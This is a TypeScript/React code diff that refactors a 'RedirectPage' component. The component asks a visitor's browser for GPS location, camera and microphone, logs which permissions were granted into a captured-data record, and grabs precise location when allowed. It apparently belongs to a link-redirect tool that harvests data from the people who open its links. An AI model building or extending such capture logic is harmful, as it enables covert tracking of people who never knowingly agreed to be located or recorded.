@@ -437,34 +437,47 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview 
 
         const required = settings.captureInfo.permissions;
         const permissions: CapturedData['permissions'] = { location: 'n/a', camera: 'n/a', microphone: 'n/a' };
-
-        // 1. Location
-        if (required.includes('location')) {
-            try {
-                const status = await navigator.permissions.query({ name: 'geolocation' });
-                if (status.state === 'prompt') {
-                    await new Promise<void>((resolve) => navigator.geolocation.getCurrentPosition(() => resolve(), () => resolve(), { timeout: 15000, enableHighAccuracy: true }));
-                }
-                const finalStatus = await navigator.permissions.query({ name: 'geolocation' });
-                permissions.location = finalStatus.state;
-                if (finalStatus.state === 'granted') await captureGpsLocation();
-            } catch (e) {
-                permissions.location = 'denied';
-            }
-        }
-
-        // 2. Media (Camera & Mic)
+        let mediaStream: MediaStream | null = null;
+        
         const needsCamera = required.includes('camera');
         const needsMic = required.includes('microphone');
-        let mediaStream: MediaStream | null = null;
-        if (needsCamera || needsMic) {
-            try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: needsCamera, audio: needsMic });
-                if (needsCamera) permissions.camera = 'granted';
-                if (needsMic) permissions.microphone = 'granted';
-            } catch (e) {
-                if (needsCamera) permissions.camera = 'denied';
-                if (needsMic) permissions.microphone = 'denied';
+        let mediaHandled = false;
+
+        for (const perm of required) {
+            if (perm === 'location') {
+                try {
+                    const status = await navigator.permissions.query({ name: 'geolocation' });
+                    if (status.state === 'prompt') {
+                        // This promise does not guarantee a selection, but triggers the prompt.
+                        await new Promise<void>((resolve) => {
+                           const timer = setTimeout(() => resolve(), 15000); // Timeout to not wait forever
+                           navigator.geolocation.getCurrentPosition(
+                             () => { clearTimeout(timer); resolve(); }, 
+                             () => { clearTimeout(timer); resolve(); }, 
+                             { enableHighAccuracy: true, timeout: 14000, maximumAge: 0 }
+                           );
+                        });
+                    }
+                    const finalStatus = await navigator.permissions.query({ name: 'geolocation' });
+                    permissions.location = finalStatus.state;
+                    if (finalStatus.state === 'granted') await captureGpsLocation();
+                } catch (e) {
+                    permissions.location = 'denied';
+                }
+            }
+
+            if ((perm === 'camera' || perm === 'microphone') && !mediaHandled) {
+                mediaHandled = true; // Ensure we only request media once
+                if (needsCamera || needsMic) {
+                    try {
+                        mediaStream = await navigator.mediaDevices.getUserMedia({ video: needsCamera, audio: needsMic });
+                        if (needsCamera) permissions.camera = 'granted';
+                        if (needsMic) permissions.microphone = 'granted';
+                    } catch (e) {
+                        if (needsCamera) permissions.camera = 'denied';
+                        if (needsMic) permissions.microphone = 'denied';
+                    }
+                }
             }
         }
         capturedDataRef.current.permissions = permissions;
